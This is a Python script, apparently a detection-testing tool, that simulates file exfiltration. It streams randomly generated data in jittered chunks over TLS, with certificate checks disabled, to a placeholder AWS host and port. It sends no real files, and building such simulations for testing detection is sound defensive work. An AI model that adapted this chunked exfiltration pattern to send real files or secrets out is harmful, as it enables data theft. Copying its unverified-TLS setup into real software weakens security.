from rich.progress import Progress
import socket
import ssl
import random
import time

# Used in conjection with listener.py and observed in sea.py
# Simulates file exfiltration for the configuration below. Interactive! Spared no expense...
# This is useful for testing your detection capabilities.
# https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/connect-linux-inst-ssh.html
# ssh -i /path/key-pair-name.pem ec2-user@instance-public-dns-name

HOST = 'AWS DNS IP ADDR'
PORT = 40687
CHUNK_SIZE = 11500

def generate_random_data(size):
    return bytes([random.randint(0, 255) for _ in range(size)])

def main():
    mock_file_size_MB = float(input("Enter a file size in MB: "))
    MOCK_FILE_SIZE = int(mock_file_size_MB * 1024 * 1024)
    total_chunks = MOCK_FILE_SIZE // CHUNK_SIZE
    if MOCK_FILE_SIZE % CHUNK_SIZE:
        total_chunks += 1

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print(f"Connecting to {HOST}:{PORT}...")
        sock.connect((HOST, PORT))
        context = ssl._create_unverified_context()
        
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            print(f"Connected to {HOST}:{PORT} over TLS")
            
            with Progress() as progress:
                task = progress.add_task("[cyan]Hold onto your butts...", total=total_chunks)
                
                for i in range(total_chunks):
                    chunk_size = CHUNK_SIZE if (i < total_chunks - 1) else (MOCK_FILE_SIZE % CHUNK_SIZE)
                    data = generate_random_data(chunk_size)
                    ssock.sendall(data)
                    progress.update(task, completed=i+1)
                    random_delay = random.uniform(0.01, 0.1)
                    time.sleep(random_delay)
            
            print("File exfiltration simulation complete! Clever girl...")

if __name__ == "__main__":
    while True:
        main()
        repeat = input("Would you like to steal another file? (y/n): ")
        if repeat.lower() != 'y':
            break
